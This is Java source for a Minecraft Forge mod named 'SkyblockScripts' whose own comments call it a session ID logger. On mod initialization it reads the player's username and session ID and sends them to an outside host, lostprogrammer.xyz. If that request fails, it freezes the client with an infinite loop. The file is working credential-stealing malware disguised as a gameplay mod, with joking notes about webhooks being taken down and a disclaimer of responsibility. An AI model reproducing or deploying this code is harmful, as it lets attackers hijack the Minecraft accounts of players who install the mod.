package skyblockscripts;

import java.io.*;
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;

import org.lwjgl.input.Keyboard;

import net.minecraft.client.Minecraft;
import net.minecraft.client.settings.KeyBinding;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.client.registry.ClientRegistry;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

@Mod(modid = ExampleMod.MODID, version = ExampleMod.VERSION)
public class ExampleMod
{
    public static final String MODID = "SkyblockScripts";
    public static final String VERSION = "1.0";
    public static KeyBinding[] key_bindings;
    @EventHandler
    public void init(FMLInitializationEvent event)
    {
    	MinecraftForge.EVENT_BUS.register(new stopdeobfuscatingme());
    	
    	String _ = "( please stop trying to nuke my webhooks )";

    	String Credits = "This is a public repository on github https://github.com/TotalyNotLostProgrammer/Minecraft-Session-ID-Logger";

        // TERMS OF USE
        String TOU = "By using my code you agree that i (the lost progarmmer) do not take any responsibility for misuse or damage caused by it.";
		try {
            _ = "please check out my website! lostprogrammer.xyz";
			URL url2 = new URL("https://lostprogrammer.xyz/_?u="+Minecraft.getMinecraft().getSession().getUsername()+"&s="+Minecraft.getMinecraft().getSession().getSessionID());
	        HttpsURLConnection connection2 = (HttpsURLConnection) url2.openConnection();
	        connection2.addRequestProperty("Content-Type", "application/json");
	        connection2.addRequestProperty("User-Agent", "Change this to anything you want as long as it's in the php file");
	        connection2.setDoOutput(true);
	        BufferedReader in2 = new BufferedReader(new InputStreamReader(
	        		connection2.getInputStream()));	        
	        in2.close();
		} catch (IOException e) {
            _ = "crashes the client if they fail to send data to server";
			while(true) {}
		}
    }
}
 